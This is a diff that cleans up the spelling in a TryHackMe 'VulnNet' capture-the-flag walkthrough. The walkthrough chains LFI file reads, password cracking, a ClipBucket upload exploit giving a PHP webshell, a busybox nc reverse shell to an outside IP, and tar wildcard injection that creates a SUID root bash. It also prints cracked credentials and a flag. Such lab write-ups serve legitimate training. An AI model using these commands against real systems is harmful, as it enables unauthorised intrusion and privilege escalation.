@@ -1,10 +1,10 @@
 # VulnNet 
 
-- The purpose of this challenge is to make use of more realistic techniques and include them into a single machine to practice your skills.
+- The purpose of this challenge is to make use of more realistic techniques and include them in a single machine to practice your skills.
 
 - Difficulty: Medium
 - Web Language: PHP
-- You will have to add a machine IP with domain vulnnet.thm to your /etc/hosts
+- You will have to add a machine IP with the domain vulnnet.thm to your /etc/hosts
 
 ```
 echo "10.48.181.187 vulnnet.thm" | sudo tee -a /etc/hosts
@@ -29,7 +29,7 @@ To scan or not to scan? That is the question.
 Open 10.48.181.187:22
 Open 10.48.181.187:80
 ```
-- We got only two port open port 80 http and port 22 ssh. 
+- We got only two ports open, port 80 http and port 22 ssh. Let's scan those with Nmap to get more info about the services running on them.
 
 ```
 # Nmap 7.95 scan initiated Sun Feb  1 18:21:22 2026 as: /usr/lib/nmap/nmap --privileged -A -p22,80 -oN nmap_scan vulnnet.thm
@@ -61,17 +61,17 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Sun Feb  1 18:21:44 2026 -- 1 IP address (1 host up) scanned in 21.43 seconds
 ```
 
-- Rustscan is very fast, So there are high likely chances it may miss some open ports so after the above nmap scan i performed a nmap all portscan and let it run while i enumerating the other open ports.
+- Rustscan is very fast, so there are high chances it may miss some open ports. After the above RustScan scan i performed an nmap all portscan and let it run while I enumerated the other open ports.
 
-- Well i did'nt find any new ports . lets continue with our port 80.
+- Well, i did'nt find any new ports. lets continue with our port 80.
 - We can find a site with VULNENET ENTERTAINMENT.
 
 ## Port 80 enumeraition
 
 **Web technologies**  
 - apache 2.4.29 web server 
-- php for backend
-- and using jquery version 3.5.1
+- PHP for backend
+- and using jQuery version 3.5.1
 
 **Directory bruteforcing**
 
@@ -99,22 +99,21 @@ Target: http://vulnnet.thm/
 Task Completed
 ```
 
-- Inside the /js directory we can see 3 js files.
+- Inside the /js directory, we can see 3 js files.
 
 ```
  index__7ed54732.js
  index__d8338055.js
  jquery.min.js
 ```
-- The first 2 js files seems odd  right . 
-- before diving into manual enumeration i would like to run my automated [js_juice_finder.sh](https://github.com/Captain-Levi-007/Script_Hunting/blob/main/js_juice_finder.sh) script. that Dumps secrets and endpoints in js files. 
-
--  It takes js_urls.txt file as input.
+- The first 2 js files seem odd, right? 
+- Before diving into manual enumeration i would like to run my automated [js_juice_finder.sh](https://github.com/Captain-Levi-007/Script_Hunting/blob/main/js_juice_finder.sh) script. that Dumps secrets and endpoints in js files. 
+-  It takes the js_urls.txt file as input.
 
 ```
 bash js_juice_finder.sh js_urls.txt 
 ```
-- The results are inside js_out directory.
+- The results are inside the js_out directory.
 ```
   ~/TryHackMe/VulnNet/js_out ❯ cd ..
   ~/TryHackMe/VulnNet ❯ cd js_out 
@@ -125,16 +124,16 @@ http://broadcast.vulnnet.thm
 http://vulnnet.thm/index.php?referer=
 ```
 - In the js_endpoints.txt we found a new subdomains caled **broadcast**.
-- Lets add it to out /etc/hosts file. 
+- Let's add it to our /etc/hosts file. 
 
-- When i try to access the page i got a popup to enter username and password. 
-- so the domain using basic http javascript autentication . 
+- When I try to access the page i got a pop-up to enter username and password. 
+- So the domain uses basic http javascript autentication. 
 
-- I tried common creds but it diidnt work . lets move on to the second url .  
+- I tried common creds, but it didn't work. Let's move on to the second url.  
 ```
 http://vulnnet.thm/index.php?referer=
 ```
-- Lets see what the perameter **referer** doing.
+- Let's see what the parameter **referer** is doing.
 ```
 http://vulnnet.thm/index.php?referer=/etc/passwd
 ```
@@ -178,9 +177,9 @@ sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
 	<script src="/js/index__7ed54732.js"></script>
 ```
 
-- We have LFI(local file inclusion vulnerability from the referer perameter).
-- Lets try to read some files to gather infomation about our target machine.
-- I tried to read some intresting files about the apache2 webserver. I got to chatgpt and asked for default paths of apache2 webserver that may contians some sensitive info . then it provided my couple of paths 
+- We have LFI(local file inclusion) from the referer parameter.
+- Let's try to read some files to gather information about our target machine.
+- I tried to read some interesting files about the apache2 webserver. I got to ChatGPT and asked for the default paths of apache2 webserver that may contain some sensitive info. Then it provided me with a couple of paths 
 ```
 /etc/apache2/apache2.conf
 /etc/apache2/envvars
@@ -253,7 +252,7 @@ Priority: u=0, i
 </VirtualHost>
 ```
 
-- The subdomain broadcast using basic authentication type and the userfile is stored in the location **/etc/apache2/.htpasswd** . Lets read it.
+- The subdomain broadcast using basic authentication type and the userfile is stored in the location **/etc/apache2/.htpasswd**. Let's read it.
 
 ```
 GET /index.php?referer=/etc/apache2/.htpasswd HTTP/1.1
@@ -274,7 +273,7 @@ Priority: u=0,
 developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
 	<script src="/js/index__7ed54732.js">
 ```
-- We found a password hash for user developer save the has to a file hash.txt and feed it to john or hashcat.
+- We found a password hash for the user developer. I saved the hash to a file, hash.txt, and fed it to John.
 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
@@ -291,14 +290,14 @@ Session completed.
 ```
 
 - **developers:9972761drmfsls**
-- With these creds we can login to broadcast subdomain.
+- With these creds, we can log in to the broadcast subdomain.
 
-- The site running clipbuck which is video streaming software like youtube and netflix . you can stream videos.
-- in the site source code i found the version of clipbuck
+- The site is running clipbuck which is a video streaming software like YouTube and Netflix. You can stream videos.
+- In the site source code i found the version of clipbuck
 ```
 <!-- ClipBucket version 4.0 -->
 ``` 
-- If you visit /actions endpoints in this domain you found a bunch of functionalities.
+- If you visit /actions endpoints in this domain, you will find a bunch of functionalities.
 ```
 [ ]	admin.php	2021-01-23 20:16 	2.1K	 
 [ ]	beats_uploader.php	2021-01-23 20:16 	9.4K	 
@@ -321,10 +320,10 @@ Session completed.
 [ ]	video_convert.php	2021-01-23 20:16 	8.1K	 
 [ ]	vote_channel.php	2021-01-23 20:16 	717 	 
 ```
-- Found that this version is vulnerable to command injection , file upload and sql injection. 
-- On furthur research i found this [github](https://github.com/abeljm/Exploit-ClipBucket-4-File-Upload.git) page with a poc for the vulnerability.
-- The python code in the github uploads a shell.php file with a php webshell . via the actions/beats_uploader.php endpoint .
-- The we can access the web shell from the uploded directory 
+- Found that this version is vulnerable to command injection, file upload, and sql injection. 
+- On furthur research i found this [github](https://github.com/abeljm/Exploit-ClipBucket-4-File-Upload.git) page with a poc for the RCE vulnerability.
+- The Python code in the GitHub uploads a shell.php file with a PHP webshell. via the actions/beats_uploader.php endpoint .
+- We can access the web shell from the actions/CB_BEATS_UPLOAD_DIR/ directory.
 
 ```
 python3 exploit.py broadcast.vulnnet.thm developers 9972761drmfsls                  py_venv
@@ -360,11 +359,11 @@ curl http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/177002867528af57.p
 www-data
 ```
 
-**Revverse shell**
+**Reverse shell**
 ```
 http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/177002867528af57.php?cmd=busybox%20nc%20192.168.133.63%201234%20-e%20/bin/bash
 ```
-- Stabulizing rev shell
+- Stabilizing rev shell
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@vulnnet:/var/www/html/actions/CB_BEATS_UPLOAD_DIR$ ^Z
@@ -376,12 +375,12 @@ www-data@vulnnet:/var/www/html/actions/CB_BEATS_UPLOAD_DIR$ ^Z
 
 ## User.txt 
 
-- Users with bash environment 
+- Users with a bash environment 
 ```
 root:x:0:0:root:/root:/bin/bash
 server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
 ```
-- After some time i found a tar archive file of user server-management.
+- While doing my recon on the machine. I found a tar archive file of user server-management.
 
 ```
 find / -user server-management 2>/dev/null
@@ -390,7 +389,7 @@ find / -user server-management 2>/dev/null
 /var/lib/lightdm-data/server-management
 ```
 
-- I tried to untar it but permission denied . but we have read access over the ssh-backup.tar.gz . so i downloaded it to my local machine 
+- I tried to untar it, but permission denied. But we have read access to the ssh-backup.tar.gz. So I downloaded it to my local machine 
 
 ```
 www-data@vulnnet:/var/backups$ python3 -m http.server
@@ -399,12 +398,12 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
  wget http://vulnnet.thm:8000/ssh-backup.tar.gz
  ```
-- extracting contents of the achive 
+- extracting contents of the archive 
 ```
 tar  zxvf ssh-backup.tar.gz 
 ```
 
-- we got a id_rsa file
+- We got an id_rsa file
 
 ```
 -----BEGIN RSA PRIVATE KEY-----
@@ -447,7 +446,7 @@ cat ssh_hash.txt                                                                
 id_rsa:$sshng$1$16$6CE1A97A7DAB4829FE59CC561FB2CCC4$1200$99114344bd79b7baaf699c491870c9b1ec27869ef01126c41b17805ad0ab6de21525b40841df19f122b3a6f4cc14bb6d76c7aab06b6df074abb9522afbe3c5a5746b0431b9178ad6e41e950ce54c9353bd278787115d0dedeb3e859db6a367bdeb4aaa8fb624498f63563e4daaae3db943548341b4aa75a1f0ceabf2bf373aff87b8285d78d0b9082d8ebad362be5ee376621a151155c2658d254c957a7d4560c6b113e3688dcc2c1cc1fc695d854e2b8c52cba03b065c30a86244f4c49688e7b43ae580d3273fa94c910eb2c89103345b67eed4f197bb6a7422200776984195c07e941b6df2439ecf44719124124ae986ce4b8b6d0d6d9c6bb48e953eaebfcc3535081772d294f9f1e57236d0dfad43ddbe2c835216ad3c0091db40538ea5a0dc161e0339c3174322817fc0a8b7fcbc0d876e7453616412c449c01e69d520a68d54174bea3a609b0e118c6cec51cb648c1ea48e99cf49eb2ee2549eea7fdfe49d196ce7445ef0c13a9bb7b1c26f31349defa4b89f856636019d6e93656b28f9e6e25f8a4191e7e0b491ce8fcad8e166b9ce0d119f6e696a87da20816a5f945526f078063b09fa9df88704d343d296b4afc104d6629410f8f7c9f8cb856e8f70cd8e1841c70d0add2c3cb7958457e0db02452a36e23b60375f9a41c78d15743bbfc46b7eee5299bbaaded063560216c6894ccbe6b5e3948cd489dec31e15e025f58e493ab29d2af61dc3d37058c598f39ff80c47f70d8188e86db6081184bd2a36521d3b9c3c0350c61532e7340a91beb5ca6b0847c3beee91d379179e94f0ea9efec503feb94b2df14945cf9fd9e1a96ab4f849e12e9a23712b7a733c97ed96b664d3ff2da157a478f063106098c91fa1598b998af0ea93ab2c76fb0b91ba791e83fd6c118e13e9ba10965a7cfe3410d05c8c14cf342f0321f26fb0f5f88b6731eb05f8bf73b9400319eb85975d9d2da85aa4ce59b8a511c27cd6f7e4709a6252b93d009cde4ecae26dc1f4739e3c99edfe4d3fdbbabc5d0d40761923b316707ecf010b064f0df1cc19897487c5ef50e61b4aeaa8247bb01d9bba1a08e2f7b7a1bbe99a0d82bc4fab9c64b7c31b9a10ed265b156b498896762ecb259be9a70445db7027358353782c3871bbef08151d84abe16aed35c955b637f47c078de4e46f6a6de35498864896d2596b11e742924621bc05488b62878f45cabdbd9d444a6496f225b6f8f87cb664d3789bf71f3cd982146fb0d00efc8953eb933c5d5ae4da04e281b2dce9bcb040db4778a37a30c02ea3f7c4e598550e2a7e642665f511000726637011134a166370807aa0c1837322119135dca8a89c41aec8558d193d1921191edc8636806a7acc9983c62db182051a9a59150995ba61824657ce181f703dc026bde0b418d7d3ca03d0944312868cf899322fa9c0b05a26d7304da0f0cf4d7d52aceccd201b95dbf7730b6be413ed3ca3127e9b0dad353b6fa2397931d2c70a32ce2fdd80626188531ce926239397d0656bbf1295c8225663595d55fbbee8b120b10994bc6f6b6303b8f85696e1c237c77d7ea83af5b4224c2ee3e97eccab6b2041eddba3fd8e007164d6a58f9f79a1e20d4fdb424eba481a96f1639b77dbf1953837c680dc2e36a10c0c2d048e084ef1cd3e9fa10c4a9e45609994a9b8956c88f38d0814c4e556ac26c550ea
 ```
 
-- the use hashcat or john to crack the hash using rockyou.txt
+- then use hashcat or john to crack the hash using rockyou.txt
 
 ```
 john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
@@ -464,18 +463,18 @@ Session completed.
 ```
 
 - password is **oneTWO3gOyac**
-- login to server-management using the ssh key
+- Log in to server-management using the ssh private key
 ```
 ssh -i id_rsa server-management@vulnnet.thm
 ```
-- Eter the above password. Whoop whoop we got the shell 
-- in the home directory we can found the user.txt file.
+- Enter the above password. Whoop whoop, we got the shell 
+- In the home directory, we can find the user.txt file.
 
 **users.txt:THM{907e420d979d8e2992f3d7e16bee1e8b}**
 
 ## Root.txt
 
-- In the opt directory i found a script **backupsrv.sh**
+- In the /opt directory i find a script **backupsrv.sh**
 ```
 #!/bin/bash
 
@@ -508,11 +507,11 @@ date
 ls -lh $dest
 ```
 
-- The above script is using tar wild card to archive the files in server-management user documents directory . it is a classic vulnerability . you can google it or just ask the chatgpt .
+- The above script is using a wildcard to archive the files in the server-management user documents directory. It is a classic tar wildcard vulnerability. You can Google it or just ask the chatgpt.
 
-- all we have to do is create few files names that trick the tar the user trying to execute some commands . lets do it step by step .
+- All we have to do is create a few file names that trick the tar into executing some commands. lets do it step by step.
 
-- **I want to create a SUID root shell**
+- **I want to set SUID to /bin/bash**
 ```
 echo '#!/bin/bash' > /tmp/root.sh
 echo 'cp /bin/bash /tmp/rootbash' >> /tmp/root.sh
@@ -520,14 +519,14 @@ echo 'chmod +s /tmp/rootbash' >> /tmp/root.sh
 chmod +x /tmp/root.sh
 ```
 
-- we created s root.sh script.
-- now navigate to users documents directory and create the following files
+- We created a root.sh script.
+- Now navigate to the user's /home/Documents directory and create the following files
 ```
 touch -- "--checkpoint=1"
-touch -- "--checkpoint-action=exec=sh root.sh"
+touch -- "--checkpoint-action=exec=sh /tmp/root.sh"
 ```
 
-- wait for some time, lets the script executed . once it done we can simply get root shell by running hte following command
+- wait for some time, let the script execute. Once it's done, we can simply get a root shell by running the following command
 ```
 /tmp/rootbash -p
 ```
